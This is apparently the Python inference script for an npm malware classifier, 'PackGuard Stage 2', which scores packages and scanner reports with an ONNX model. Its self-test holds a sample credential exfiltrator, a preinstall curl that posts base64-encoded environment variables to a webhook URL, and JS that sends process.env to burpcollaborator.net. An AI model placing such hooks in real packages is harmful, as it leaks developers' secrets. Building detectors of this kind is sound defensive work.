import argparse
import collections
import glob
import json
import os
import time
from pathlib import Path
from typing import Any, Dict, List, Optional, Tuple

import numpy as np
import onnxruntime as ort

from text_formatter import format_scanner_chunks_to_text

TIERS = ("T1", "T2", "T3", "T4")
JS_EXT = (".js", ".cjs", ".mjs")
HOOKS = ("preinstall", "install", "postinstall")
PAD_TOKEN_ID = 50283
PAD_TOKEN = "[PAD]"


class PackGuardStage2Model:
    """
    Lightweight CPU ONNX Runtime wrapper for PackGuard Stage 2 ModernBERT v2.
    Supports both fast standalone `tokenizers` (`tokenizer.json`) and `transformers` (`AutoTokenizer`),
    as well as both single-record and batched (`predict_records_batch`) inference.
    """

    def __init__(
        self,
        model_dir: Path,
        max_length: int = 512,
        threshold: Optional[float] = None,
        threads: int = 4,
    ) -> None:
        self.model_dir = Path(model_dir).resolve()
        self.max_length = max_length

        onnx_candidates = [
            self.model_dir / "packguard_modernbert_v2_int8.onnx",
            self.model_dir / "packguard_modernbert_int8.onnx",
            self.model_dir / "packguard_modernbert_v2_fp32.onnx",
        ]
        onnx_path = next((p for p in onnx_candidates if p.exists()), None)
        if onnx_path is None:
            raise FileNotFoundError(
                f"No ONNX model found in {self.model_dir}. "
                "Run `bash install_model.sh` (Linux/WSL) or `.\\install_model.ps1` (Windows) first."
            )

        # Prefer standalone `tokenizers` (loads directly from tokenizer.json without needing transformers)
        tokenizer_json = self.model_dir / "tokenizer.json"
        self._use_fast_tokenizers_lib = False
        if tokenizer_json.exists():
            try:
                from tokenizers import Tokenizer

                self.fast_tokenizer = Tokenizer.from_file(str(tokenizer_json))
                self.fast_tokenizer.enable_truncation(max_length=self.max_length)
                self.fast_tokenizer.enable_padding(
                    direction="right",
                    pad_id=PAD_TOKEN_ID,
                    pad_token=PAD_TOKEN,
                    pad_to_multiple_of=8,
                )
                self._use_fast_tokenizers_lib = True
            except ImportError:
                pass

        if not self._use_fast_tokenizers_lib:
            from transformers import AutoTokenizer

            self.hf_tokenizer = AutoTokenizer.from_pretrained(str(self.model_dir))

        if threshold is not None:
            self.threshold = float(threshold)
        else:
            thresh_file = self.model_dir / "best_threshold.json"
            if thresh_file.exists():
                doc = json.loads(thresh_file.read_text(encoding="utf-8"))
                self.threshold = float(doc.get("threshold", 0.72))
            else:
                self.threshold = 0.72

        sess_options = ort.SessionOptions()
        sess_options.intra_op_num_threads = threads
        sess_options.graph_optimization_level = ort.GraphOptimizationLevel.ORT_ENABLE_ALL
        self.session = ort.InferenceSession(
            str(onnx_path),
            sess_options=sess_options,
            providers=["CPUExecutionProvider"],
        )

    def _tokenize_texts(self, texts: List[str]) -> Dict[str, np.ndarray]:
        """Tokenize and pad a batch of texts into 2D int64 input_ids and attention_mask."""
        if self._use_fast_tokenizers_lib:
            if len(texts) == 1:
                # Single-item fast path without unnecessary padding
                self.fast_tokenizer.no_padding()
                enc = self.fast_tokenizer.encode(texts[0])
                self.fast_tokenizer.enable_padding(
                    direction="right",
                    pad_id=PAD_TOKEN_ID,
                    pad_token=PAD_TOKEN,
                    pad_to_multiple_of=8,
                )
                return {
                    "input_ids": np.array([enc.ids], dtype=np.int64),
                    "attention_mask": np.array([enc.attention_mask], dtype=np.int64),
                }
            encodings = self.fast_tokenizer.encode_batch(texts)
            return {
                "input_ids": np.array([e.ids for e in encodings], dtype=np.int64),
                "attention_mask": np.array([e.attention_mask for e in encodings], dtype=np.int64),
            }
        else:
            enc = self.hf_tokenizer(
                texts,
                return_tensors="np",
                truncation=True,
                max_length=self.max_length,
                padding=(len(texts) > 1),
                pad_to_multiple_of=(8 if len(texts) > 1 else None),
            )
            return {
                "input_ids": enc["input_ids"].astype(np.int64),
                "attention_mask": enc["attention_mask"].astype(np.int64),
            }

    def predict_record(self, record: Dict[str, Any]) -> Tuple[bool, float]:
        """Return `(is_malicious, malicious_probability)` for a single Stage 1 report JSON."""
        return self.predict_records_batch([record], batch_size=1)[0]

    def predict_records_batch(
        self, records: List[Dict[str, Any]], batch_size: int = 8
    ) -> List[Tuple[bool, float]]:
        """
        Format, tokenize, pad, and score a list of Stage 1 report dicts in batches.
        Returns a list of `(is_malicious, malicious_probability)` tuples.
        """
        results: List[Tuple[bool, float]] = [(False, 0.0)] * len(records)
        valid_indices: List[int] = []
        valid_texts: List[str] = []

        for idx, rec in enumerate(records):
            formatted = format_scanner_chunks_to_text(rec)
            if formatted and formatted != "// [EMPTY_PACKAGE]":
                valid_indices.append(idx)
                valid_texts.append(formatted)

        for start in range(0, len(valid_texts), batch_size):
            batch_texts = valid_texts[start : start + batch_size]
            batch_idx = valid_indices[start : start + batch_size]
            ort_inputs = self._tokenize_texts(batch_texts)
            logits = self.session.run(["logits"], ort_inputs)[0]

            shifted = logits - np.max(logits, axis=-1, keepdims=True)
            exp_scores = np.exp(shifted)
            probs = exp_scores / np.sum(exp_scores, axis=-1, keepdims=True)

            for orig_i, mal_p in zip(batch_idx, probs[:, 1]):
                p = float(mal_p)
                results[orig_i] = (bool(p >= self.threshold), round(p, 6))

        return results


def package_dir_to_record(pkg_dir: Path) -> Dict[str, Any]:
    """Convert a raw npm package directory on disk into a Stage 1 report-compatible dict."""
    chunks: List[Dict[str, Any]] = []
    install_txt = pkg_dir / "install_scripts.txt"
    if install_txt.exists():
        txt = install_txt.read_text(encoding="utf-8", errors="replace").strip()
        if txt:
            chunks.append({"file": "install_scripts.txt", "kind": "script", "start": 0, "ncd": 0.1, "text": txt})

    pkg_json = pkg_dir / "package.json"
    if pkg_json.exists():
        try:
            doc = json.loads(pkg_json.read_text(encoding="utf-8", errors="replace"))
            scripts = doc.get("scripts")
            if isinstance(scripts, dict):
                lines = [f"{h}: {scripts[h]}" for h in HOOKS if isinstance(scripts.get(h), str) and scripts[h].strip()]
                if lines:
                    chunks.append({"file": "package.json", "kind": "script", "start": 0, "ncd": 0.1, "text": "\n".join(lines)})
        except Exception:
            pass

    js_files = [
        p for p in sorted(pkg_dir.rglob("*"))
        if p.is_file() and p.name.endswith(JS_EXT) and "node_modules" not in p.parts
    ]
    for p in js_files[:10]:
        txt = p.read_text(encoding="utf-8", errors="replace")
        if txt.strip():
            chunks.append({"file": p.name, "kind": "js", "start": 0, "ncd": 0.2, "text": txt[:16384]})

    return {"package": pkg_dir.name, "version": "1.0.0", "flagged": True, "chunks": chunks}


def run_self_test(model: PackGuardStage2Model) -> None:
    """Verify the installed ONNX model on sample benign (T0, T3, T4, install script) and malicious inputs."""
    samples = [
        (
            "Benign Utility (T0)",
            0,
            {
                "chunks": [
                    {
                        "file": "index.js",
                        "kind": "js",
                        "start": 0,
                        "text": "module.exports = function clamp(val, min, max) {\n  return Math.min(Math.max(val, min), max);\n};\n",
                    }
                ]
            },
        ),
        (
            "Benign Build Hook (husky + tsc)",
            0,
            {
                "chunks": [
                    {"file": "package.json", "kind": "script", "start": 0, "text": "postinstall: husky install || true"},
                    {"file": "index.js", "kind": "js", "start": 0, "text": "export const VERSION = '2.1.0';\n"},
                ]
            },
        ),
        (
            "Benign Base64-Wrapped T4 Control",
            0,
            {
                "chunks": [
                    {
                        "file": "index.js",
                        "kind": "js",
                        "start": 0,
                        "text": 'eval(Buffer.from("bW9kdWxlLmV4cG9ydHMgPSBmdW5jdGlvbiBpc09iamVjdCh4KSB7IHJldHVybiB0eXBlb2YgeCA9PT0gJ29iamVjdCcgJiYgeCAhPT0gbnVsbDsgfTsK","base64").toString());\n',
                    }
                ]
            },
        ),
        (
            "Malicious Credential Exfiltrator",
            1,
            {
                "chunks": [
                    {
                        "file": "install_scripts.txt",
                        "kind": "script",
                        "start": 0,
                        "text": "preinstall: curl -s -X POST https://webhook.site/a8f92b -d \"$(env | base64)\"",
                    },
                    {
                        "file": "index.js",
                        "kind": "js",
                        "start": 0,
                        "text": "const os = require('os'); const https = require('https');\nconst data = JSON.stringify({u: os.userInfo(), env: process.env});\nhttps.request({hostname: 'burpcollaborator.net', method: 'POST'}).end(data);",
                    },
                ]
            },
        ),
    ]

    print(f"[PackGuard Stage 2 v2] Running self-test (threshold={model.threshold:.4f})...")
    passed = 0
    for name, expected, rec in samples:
        t0 = time.perf_counter()
        flagged, prob = model.predict_record(rec)
        ms = (time.perf_counter() - t0) * 1000.0
        ok = int(flagged) == expected
        passed += int(ok)
        verdict = "MALICIOUS" if flagged else "BENIGN"
        status = "PASS" if ok else "FAIL"
        print(f"  [{status}] {name:<34} -> {verdict:<9} (prob={prob:.4f}, {ms:.1f} ms)")
    print(f"[PackGuard Stage 2 v2] Self-test complete: {passed}/{len(samples)} passed.")


def main() -> None:
    parser = argparse.ArgumentParser(
        description="PackGuard Stage 2 v2 Neural Filter (CPU ONNX Runtime)."
    )
    parser.add_argument(
        "--model-dir",
        default=str(Path(__file__).resolve().parent / "model_int8"),
        help="Directory containing packguard_modernbert_v2_int8.onnx and tokenizer.",
    )
    parser.add_argument(
        "--reports",
        default="",
        help="Directory of Stage 1 JSON reports (e.g., ~/pg-v6/test/r3 or ~/pg-v5/reports).",
    )
    parser.add_argument(
        "--report",
        default="",
        help="Single Stage 1 JSON report file to score.",
    )
    parser.add_argument(
        "--package",
        default="",
        help="Raw npm package directory to score directly.",
    )
    parser.add_argument(
        "--out-dir",
        default="",
        help="Optional directory to write updated JSON reports with Stage 2 verdicts.",
    )
    parser.add_argument(
        "--all-packages",
        action="store_true",
        help="Run Stage 2 on all reports in --reports (default: only filter Stage 1 flagged reports).",
    )
    parser.add_argument(
        "--batch-size",
        type=int,
        default=8,
        help="Batch size when scoring multiple Stage 1 reports (default: 8).",
    )
    parser.add_argument(
        "--threshold",
        type=float,
        default=None,
        help="Override calibrated malicious probability threshold.",
    )
    parser.add_argument(
        "--threads",
        type=int,
        default=4,
        help="Number of CPU threads for ONNX Runtime.",
    )
    parser.add_argument(
        "--self-test",
        action="store_true",
        help="Run built-in verification self-test.",
    )
    args = parser.parse_args()

    model = PackGuardStage2Model(
        model_dir=Path(args.model_dir),
        threshold=args.threshold,
        threads=args.threads,
    )

    if args.self_test or (not args.reports and not args.report and not args.package):
        run_self_test(model)
        return

    if args.package:
        pkg_path = Path(os.path.expanduser(args.package)).resolve()
        rec = package_dir_to_record(pkg_path)
        t0 = time.perf_counter()
        flagged, prob = model.predict_record(rec)
        ms = (time.perf_counter() - t0) * 1000.0
        print(
            json.dumps(
                {
                    "package": pkg_path.name,
                    "stage2_flagged": flagged,
                    "stage2_prob": prob,
                    "threshold": model.threshold,
                    "latency_ms": round(ms, 2),
                },
                indent=2,
            )
        )
        return

    if args.report:
        rep_path = Path(os.path.expanduser(args.report)).resolve()
        rec = json.loads(rep_path.read_text(encoding="utf-8"))
        t0 = time.perf_counter()
        flagged, prob = model.predict_record(rec)
        ms = (time.perf_counter() - t0) * 1000.0
        print(
            json.dumps(
                {
                    "report": rep_path.name,
                    "package": rec.get("package"),
                    "stage1_flagged": bool(rec.get("flagged", True)),
                    "stage2_flagged": flagged,
                    "stage2_prob": prob,
                    "threshold": model.threshold,
                    "latency_ms": round(ms, 2),
                },
                indent=2,
            )
        )
        return

    # Directory mode (--reports): compatible with experiments/v6/scripts/summarize.py
    reports_dir = Path(os.path.expanduser(args.reports)).resolve()
    out_dir = Path(os.path.expanduser(args.out_dir)).resolve() if args.out_dir else None
    if out_dir:
        out_dir.mkdir(parents=True, exist_ok=True)

    report_files = sorted(glob.glob(str(reports_dir / "*.json")))
    if not report_files:
        raise FileNotFoundError(f"No *.json report files found in {reports_dir}")

    all_paths = [Path(p) for p in report_files]
    all_records = [json.loads(p.read_text(encoding="utf-8")) for p in all_paths]

    to_eval_indices = [
        i for i, r in enumerate(all_records) if args.all_packages or bool(r.get("flagged", True))
    ]
    to_eval_records = [all_records[i] for i in to_eval_indices]

    t0 = time.perf_counter()
    batch_verdicts = model.predict_records_batch(to_eval_records, batch_size=args.batch_size)
    stage2_seconds = time.perf_counter() - t0

    verdict_by_idx = dict(zip(to_eval_indices, batch_verdicts))

    counts = collections.defaultdict(lambda: [0, 0])
    for idx, (path, r) in enumerate(zip(all_paths, all_records)):
        name = path.stem
        parts = name.split("__", 2)
        tier, cat = (parts[0], parts[1]) if parts[0] in TIERS else ("ALL", parts[0])
        s1_hit = bool(r.get("flagged", True))

        if idx in verdict_by_idx:
            s2_hit, s2_prob = verdict_by_idx[idx]
            final_hit = s2_hit if args.all_packages else (s1_hit and s2_hit)
            r["stage2_prob"] = s2_prob
            r["stage2_flagged"] = s2_hit
            r["flagged"] = final_hit
        else:
            final_hit = False
            r["stage2_prob"] = 0.0
            r["stage2_flagged"] = False

        if out_dir:
            (out_dir / path.name).write_text(json.dumps(r, indent=2), encoding="utf-8")

        label = "mal" if cat.startswith("mal") else "ben"
        for key in {(tier, cat), (tier, label), ("ALL", label), ("ALL", cat)}:
            counts[key][0] += int(final_hit)
            counts[key][1] += 1

    summary = {
        f"{k[0]}/{k[1]}": {"flagged": v[0], "total": v[1], "rate": v[0] / v[1]}
        for k, v in sorted(counts.items())
    }
    for k, v in summary.items():
        print(f"{k:<20} {v['flagged']:4d}/{v['total']:4d}  {100 * v['rate']:5.1f}%")
    print(
        json.dumps(
            {
                "stage2_evaluated_packages": len(to_eval_indices),
                "stage2_batch_size": args.batch_size,
                "stage2_total_seconds": round(stage2_seconds, 3),
                "threshold": model.threshold,
            }
        )
    )


if __name__ == "__main__":
    main()
